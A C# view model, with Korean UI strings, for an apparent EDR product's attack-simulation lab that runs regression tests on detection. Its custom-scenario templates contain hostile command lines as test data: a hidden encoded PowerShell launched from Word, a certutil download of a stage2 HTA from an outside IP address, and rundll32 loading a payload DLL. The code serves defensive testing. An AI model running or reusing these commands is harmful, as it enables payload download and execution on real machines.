using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Linq;
using System.Threading.Tasks;
using CommunityToolkit.Mvvm.ComponentModel;
using CommunityToolkit.Mvvm.Input;
using Phalanx.Cockpit.Scenarios;
using Phalanx.Cockpit.Services;

namespace Phalanx.Cockpit.ViewModels;

/// <summary>
/// Phalanx Enterprise EDR AttackLab(모의 침해 공격 공작소 및 회귀 테스트 랩) 전담 뷰모델
/// </summary>
public partial class AttackLabViewModel : ObservableObject
{
    private readonly AttackLabScenarioRunner _labRunner;
    private readonly List<ScenarioExecutionResult> _recentLabResults = new();

    public const int CustomScenarioId = 99;

    public ObservableCollection<AttackScenario> Scenarios { get; } = new(
        AttackScenarioRegistry.AllScenarios) { AttackScenarioRegistry.CustomStudioScenario };

    [ObservableProperty]
    private AttackScenario? _selectedScenario;

    public bool IsCustomScenarioSelected => SelectedScenario?.Id == CustomScenarioId;
    public bool IsGoldenScenarioSelected => !IsCustomScenarioSelected;

    partial void OnSelectedScenarioChanged(AttackScenario? value)
    {
        OnPropertyChanged(nameof(IsCustomScenarioSelected));
        OnPropertyChanged(nameof(IsGoldenScenarioSelected));
    }

    [ObservableProperty]
    private string _simulatorLog = "시나리오를 선택하여 [모의 침해 주입]을 실행하면 실시간 방어 검증 결과가 여기에 출력됩니다.";

    // =========================================================================
    // AttackLab Professional Workbench Observables
    // =========================================================================
    [ObservableProperty]
    private string _selectedLabMode = "grpc"; // "grpc", "os", "live"

    public bool IsModeGrpc => SelectedLabMode == "grpc";
    public bool IsModeOs => SelectedLabMode == "os";
    public bool IsModeLive => SelectedLabMode == "live";

    public AttackLabMode CurrentLabModeEnum => IsModeLive ? AttackLabMode.LiveExpert : (IsModeOs ? AttackLabMode.OsHybrid : AttackLabMode.CleanRoom);

    [ObservableProperty]
    private int _selectedLabTab = 0; // 0: Golden Scenarios, 1: Custom Studio

    public bool IsGoldenScenariosTab => SelectedLabTab == 0;
    public bool IsCustomStudioTab => SelectedLabTab == 1;

    [ObservableProperty]
    private bool _isArchitectureGuideVisible;

    // Custom Scenario Studio State
    [ObservableProperty]
    private string _customTargetImage = "powershell.exe";

    [ObservableProperty]
    private string _customParentImage = "winword.exe";

    [ObservableProperty]
    private string _customCommandLine = "powershell.exe -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0A...";

    [ObservableProperty]
    private string _customMitreTactic = "T1059.001";

    [ObservableProperty]
    private string _customExpectedAction = "ACTION_KILL";

    [ObservableProperty]
    private bool _customIsSuspended = true;

    // Real-time Diagnostics Profiler State
    [ObservableProperty]
    private string _latestVerdictStatus = "READY"; // READY, PASS, BENIGN, FAIL, IN_PROGRESS

    [ObservableProperty]
    private string _latestScenarioName = "대기 중 (시나리오 미실행)";

    [ObservableProperty]
    private string _latestLatencyText = "0 ms";

    [ObservableProperty]
    private string _latestTurnCountText = "-";

    [ObservableProperty]
    private string _latestToolsText = "호출 대기 중";

    [ObservableProperty]
    private string _latestConfidenceText = "-";

    [ObservableProperty]
    private string _latestAssertionText = "시나리오를 선택하여 [모의 침해 주입]을 실행하면 실시간 방어 정합성 및 SLA 평가가 수행됩니다.";

    [ObservableProperty]
    private bool _sensorConnected;

    public AttackLabViewModel(AttackLabScenarioRunner labRunner, CockpitUiBridge? uiBridge = null)
    {
        _labRunner = labRunner ?? throw new ArgumentNullException(nameof(labRunner));
        if (uiBridge != null)
        {
            uiBridge.SensorConnectionChanged += connected => SensorConnected = connected;
        }
    }

    [RelayCommand]
    private void SetLabMode(string mode)
    {
        SelectedLabMode = mode;
        OnPropertyChanged(nameof(IsModeGrpc));
        OnPropertyChanged(nameof(IsModeOs));
        OnPropertyChanged(nameof(IsModeLive));
        OnPropertyChanged(nameof(CurrentLabModeEnum));
        SimulatorLog += $"\n[{DateTime.Now:HH:mm:ss}] [모드 변경] 실행 모드가 '{mode.ToUpperInvariant()}' (으)로 변경되었습니다.";
    }

    [RelayCommand]
    private void ToggleArchitectureGuide()
    {
        IsArchitectureGuideVisible = !IsArchitectureGuideVisible;
    }

    [RelayCommand]
    private void CloseArchitectureGuide()
    {
        IsArchitectureGuideVisible = false;
    }

    [RelayCommand]
    private void SelectLabTab(string tabIndexStr)
    {
        if (int.TryParse(tabIndexStr, out int idx))
        {
            SelectedLabTab = idx;
            OnPropertyChanged(nameof(IsGoldenScenariosTab));
            OnPropertyChanged(nameof(IsCustomStudioTab));
        }
    }

    [RelayCommand]
    private void SetCustomExpectedAction(string action)
    {
        CustomExpectedAction = action;
    }

    [RelayCommand]
    private void ApplyCustomTemplate(string templateName)
    {
        switch (templateName.ToLowerInvariant())
        {
            case "powershell":
                CustomTargetImage = "powershell.exe";
                CustomParentImage = "winword.exe";
                CustomCommandLine = "powershell.exe -w hidden -enc JABjAGwAYQBzAHMAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAOw...";
                CustomMitreTactic = "T1059.001 (Command and Scripting Interpreter: PowerShell)";
                CustomExpectedAction = "ACTION_KILL";
                CustomIsSuspended = true;
                break;
            case "certutil":
                CustomTargetImage = "certutil.exe";
                CustomParentImage = "excel.exe";
                CustomCommandLine = "certutil.exe -urlcache -split -f http://185.220.101.5/stage2.hta C:\\Windows\\Temp\\stage2.hta";
                CustomMitreTactic = "T1105 (Ingress Tool Transfer)";
                CustomExpectedAction = "ACTION_KILL";
                CustomIsSuspended = true;
                break;
            case "rundll32":
                CustomTargetImage = "rundll32.exe";
                CustomParentImage = "cmd.exe";
                CustomCommandLine = "rundll32.exe C:\\Windows\\Temp\\payload.dll,DllRegisterServer";
                CustomMitreTactic = "T1218.011 (System Binary Proxy Execution: Rundll32)";
                CustomExpectedAction = "ACTION_KILL";
                CustomIsSuspended = true;
                break;
            case "benign":
                CustomTargetImage = "powershell.exe";
                CustomParentImage = "explorer.exe";
                CustomCommandLine = "powershell.exe -NoProfile -Command \"Get-Service | Where-Object {$_.Status -eq 'Running'}\"";
                CustomMitreTactic = "Known-Good Baseline (Admin Query)";
                CustomExpectedAction = "ACTION_RESUME";
                CustomIsSuspended = false;
                break;
        }
        SimulatorLog += $"\n[{DateTime.Now:HH:mm:ss}] [템플릿 적용] '{templateName}' 프리셋 파라미터가 공작소에 로드되었습니다.";
    }

    [RelayCommand]
    private async Task RunCurrentScenarioAsync()
    {
        if (SelectedScenario == null) return;
        if (SelectedScenario.Id == CustomScenarioId)
        {
            await RunCustomScenarioAsync();
        }
        else
        {
            await RunScenarioAsync(SelectedScenario.Id);
        }
    }

    [RelayCommand]
    public async Task RunScenarioAsync(int scenarioId)
    {
        var sc = Scenarios.FirstOrDefault(s => s.Id == scenarioId);
        if (sc == null) return;

        var fullSc = AttackScenarioRegistry.FindById(scenarioId);
        if (fullSc == null) return;

        LatestScenarioName = $"#{sc.Id}: {sc.Name}";
        LatestVerdictStatus = "IN_PROGRESS";
        LatestLatencyText = "측정 중...";
        LatestTurnCountText = "추론 중...";
        LatestToolsText = "도구 체인 탐색 중...";
        LatestConfidenceText = "-";
        LatestAssertionText = $"시나리오 #{sc.Id} 주입 시작 (모드: {SelectedLabMode.ToUpperInvariant()})...";

        SimulatorLog = $"[{DateTime.Now:HH:mm:ss}] [시뮬레이션 개시] 시나리오 {sc.Id}: {sc.Name}\n" +
                       $" - 설명: {sc.Description}\n" +
                       $" - 기대 처분: {sc.ExpectedAction}\n" +
                       $" - 실행 모드: {SelectedLabMode.ToUpperInvariant()} ({(IsModeLive ? "전문가 라이브 OS 실행" : (IsModeOs ? "실제 OS 안전 프로세스 연동" : "Clean-Room 가상 주입"))})\n" +
                       $" - 상태: 텔레메트리 스트림 인프로세스 전송 중...";

        try
        {
            var result = await _labRunner.ExecuteScenarioAsync(fullSc, CurrentLabModeEnum);
            _recentLabResults.Add(result);

            LatestVerdictStatus = result.IsPass ? (sc.ExpectedAction == "ACTION_KILL" ? "PASS" : "BENIGN") : "FAIL";
            LatestLatencyText = $"{result.Elapsed.TotalMilliseconds:F1} ms";
            LatestTurnCountText = $"{result.TurnCount} 턴";
            LatestToolsText = result.ToolChain;
            LatestConfidenceText = $"{result.Confidence * 100:F1}%";
            LatestAssertionText = result.AssertionMessage;

            foreach (var line in result.LogEntries)
            {
                SimulatorLog += $"\n{line}";
            }
        }
        catch (Exception ex)
        {
            LatestVerdictStatus = "FAIL";
            LatestAssertionText = $"FAIL: 오류 발생 - {ex.Message}";
            SimulatorLog += $"\n[오류] {ex.Message}";
        }
    }

    [RelayCommand]
    public async Task RunCustomScenarioAsync()
    {
        LatestScenarioName = $"커스텀: {CustomTargetImage}";
        LatestVerdictStatus = "IN_PROGRESS";
        LatestLatencyText = "측정 중...";
        LatestTurnCountText = "추론 중...";
        LatestToolsText = "도구 체인 탐색 중...";
        LatestConfidenceText = "-";
        LatestAssertionText = $"커스텀 공격 페이로드 주입 및 분석 중... (부모: {CustomParentImage}, 타깃: {CustomTargetImage})";

        SimulatorLog = $"[{DateTime.Now:HH:mm:ss}] [커스텀 침해 주입 개시]\n" +
                       $" - 타깃 프로세스 : {CustomTargetImage}\n" +
                       $" - 부모 프로세스 : {CustomParentImage}\n" +
                       $" - 명령줄       : {CustomCommandLine}\n" +
                       $" - MITRE 전술    : {CustomMitreTactic}\n" +
                       $" - 기대 처분     : {CustomExpectedAction}\n" +
                       $" - 실행 모드     : {SelectedLabMode.ToUpperInvariant()}\n" +
                       $" - 상태         : 텔레메트리 스트림 전송 중...";

        try
        {
            var result = await _labRunner.ExecuteCustomScenarioAsync(
                CustomTargetImage,
                CustomParentImage,
                CustomCommandLine,
                CustomMitreTactic,
                CustomExpectedAction,
                CurrentLabModeEnum);

            _recentLabResults.Add(result);

            LatestVerdictStatus = result.IsPass ? (CustomExpectedAction == "ACTION_KILL" ? "PASS" : "BENIGN") : "FAIL";
            LatestLatencyText = $"{result.Elapsed.TotalMilliseconds:F1} ms";
            LatestTurnCountText = $"{result.TurnCount} 턴";
            LatestToolsText = result.ToolChain;
            LatestConfidenceText = $"{result.Confidence * 100:F1}%";
            LatestAssertionText = result.AssertionMessage;

            foreach (var line in result.LogEntries)
            {
                SimulatorLog += $"\n{line}";
            }
        }
        catch (Exception ex)
        {
            LatestVerdictStatus = "FAIL";
            LatestAssertionText = $"FAIL: {ex.Message}";
            SimulatorLog += $"\n[오류] {ex.Message}";
        }
    }

    [RelayCommand]
    public async Task RunAllScenariosBatchAsync()
    {
        LatestScenarioName = "1~10번 전 시나리오 일괄 회귀 테스트";
        LatestVerdictStatus = "IN_PROGRESS";
        LatestLatencyText = "집계 중...";
        LatestTurnCountText = "순차 완주 중...";
        LatestToolsText = "5대 포렌식 도구 풀체인";
        LatestConfidenceText = "평가 중...";
        LatestAssertionText = "1~10번 전 시나리오 순차 실측 주입 및 자동 어설션이 진행 중입니다...";

        SimulatorLog = $"[{DateTime.Now:HH:mm:ss}] [전 시나리오 일괄 회귀 테스트 개시] 1~10번 순차 주입 시작...\n" +
                       $"================================================================================";

        int passed = 0;
        int total = 0;
        double totalMs = 0;
        int totalTurns = 0;

        foreach (var sc in Scenarios.Where(s => s.Id != CustomScenarioId))
        {
            var fullSc = AttackScenarioRegistry.FindById(sc.Id);
            if (fullSc == null) continue;

            total++;
            SimulatorLog += $"\n[{DateTime.Now:HH:mm:ss}] ▶ 시나리오 #{fullSc.Id}: {fullSc.Name} 주입 중...";

            try
            {
                var result = await _labRunner.ExecuteScenarioAsync(fullSc, CurrentLabModeEnum);
                _recentLabResults.Add(result);

                totalMs += result.Elapsed.TotalMilliseconds;
                totalTurns += result.TurnCount;
                if (result.IsPass) passed++;

                SimulatorLog += $" ➔ [{(result.IsPass ? "PASS" : "FAIL")}] (소요: {result.Elapsed.TotalMilliseconds:F1}ms, 턴: {result.TurnCount}, 판결: {result.ActualAction})";
            }
            catch (Exception ex)
            {
                SimulatorLog += $" ➔ [오류] {ex.Message}";
            }
        }

        bool allPassed = total > 0 && passed == total;
        LatestVerdictStatus = allPassed ? "PASS" : "FAIL";
        LatestLatencyText = total > 0 ? $"평균 {(totalMs / total):F1} ms" : "0 ms";
        LatestTurnCountText = total > 0 ? $"평균 {((double)totalTurns / total):F1} 턴" : "0 턴";
        LatestToolsText = "5대 도구 전수 매핑 완주";
        LatestConfidenceText = "실측 100% 집계";
        LatestAssertionText = $"전체 {total}개 시나리오 중 {passed}개 통과 (성공률: {(total > 0 ? (double)passed / total * 100 : 0):F1}%).";

        SimulatorLog += $"\n================================================================================\n" +
                        $"[{DateTime.Now:HH:mm:ss}] [회귀 테스트 완주] 총 {total}개 중 {passed}개 통과 (성공률: {(total > 0 ? (double)passed / total * 100 : 0):F1}%)\n" +
                        $"감사 로그가 준비되었습니다. '리포트 덤프'를 통해 JSON 파일로 저장할 수 있습니다.";
    }

    [RelayCommand]
    public async Task ExportAuditReportAsync()
    {
        try
        {
            var resultsToExport = _recentLabResults.Count > 0 ? _recentLabResults : new List<ScenarioExecutionResult>();
            string savedPath = await _labRunner.ExportAuditReportAsync(resultsToExport);
            SimulatorLog += $"\n[{DateTime.Now:HH:mm:ss}] [감사 보고서 출력] 포렌식 감사 기록({resultsToExport.Count}건)이 디스크에 저장되었습니다.\n" +
                            $" ➔ 저장 경로: {savedPath} (Exit Code 0)";
        }
        catch (Exception ex)
        {
            SimulatorLog += $"\n[{DateTime.Now:HH:mm:ss}] [리포트 출력 오류] {ex.Message}";
        }
    }

    [RelayCommand]
    public void ClearSimulatorLog()
    {
        SimulatorLog = $"[{DateTime.Now:HH:mm:ss}] 방어 검증 로그가 초기화되었습니다. 시나리오를 선택하여 주입하십시오.";
        _recentLabResults.Clear();
    }
}
